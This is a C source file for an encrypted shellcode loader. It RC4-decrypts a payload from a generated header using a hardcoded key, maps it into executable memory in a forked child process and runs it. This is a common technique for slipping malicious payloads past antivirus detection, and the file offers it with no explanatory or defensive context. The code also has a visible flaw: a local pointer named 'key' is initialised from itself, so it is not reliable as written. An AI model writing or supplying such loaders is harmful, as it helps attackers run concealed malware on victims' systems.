#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/wait.h>

unsigned char key[16] = "0123456789012345"; // RC4 key

void rc4_init(unsigned char *s, unsigned char *key, int keylen) {
    int i, j = 0, k;
    unsigned char temp;

    for (i = 0; i < 256; i++) {
        s[i] = i;
    }

    for (i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % keylen]) % 256;
        temp = s[i];
        s[i] = s[j];
        s[j] = temp;
    }
}

void rc4_crypt(unsigned char *s, unsigned char *data, int datalen) {
    int i = 0, j = 0, k, t;
    unsigned char temp;

    for (k = 0; k < datalen; k++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;

        temp = s[i];
        s[i] = s[j];
        s[j] = temp;

        t = (s[i] + s[j]) % 256;
        data[k] ^= s[t];
    }
}

void decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key, unsigned char *plaintext) {
    unsigned char s[256];
    memcpy(plaintext, ciphertext, ciphertext_len);
    rc4_init(s, key, strlen((char *)key));
    rc4_crypt(s, plaintext, ciphertext_len);
}

// Include the generated header file
#include "encoded_payload.h"

int main() {

    int ciphertext_len = BUF_SIZE - 1;
    unsigned char decrypted_buf[ciphertext_len];
    unsigned char *key = key;

    decrypt(buf, ciphertext_len, key, decrypted_buf);

    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    if (pid == 0) { // Child process
        void *exec_mem = mmap(NULL, ciphertext_len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (exec_mem == MAP_FAILED) {
            perror("mmap");
            exit(EXIT_FAILURE);
        }

        memcpy(exec_mem, decrypted_buf, ciphertext_len);

        ((void (*)(void))exec_mem)();

        munmap(exec_mem, ciphertext_len);
        exit(0);
    } else { // Parent process
        wait(NULL); // Wait for the child process to finish
    }

    return 0;
}
